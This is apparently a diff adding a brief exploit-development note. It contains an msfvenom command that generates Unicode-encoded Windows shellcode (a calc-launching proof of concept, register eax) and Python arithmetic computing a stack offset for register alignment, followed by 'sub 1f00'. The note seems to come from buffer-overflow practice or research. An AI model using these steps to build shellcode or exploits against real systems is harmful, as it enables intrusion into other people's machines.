@@ -1,0 +1,11 @@
+msfvenom -a x86 --platform Windows -p windows/exec CMD=calc | msfvenom -a x86 --platform Windows -e x86/unicode_mixed -i 1 BufferRegister=eax > ok
+
+to gen the unicode payload
+
+
+>>> 0x0012fda0 - 0x0012de24
+8060
+>>> hex(0x0012fda0 - 0x0012de24)
+'0x1f7c'
+
+sub 1f00
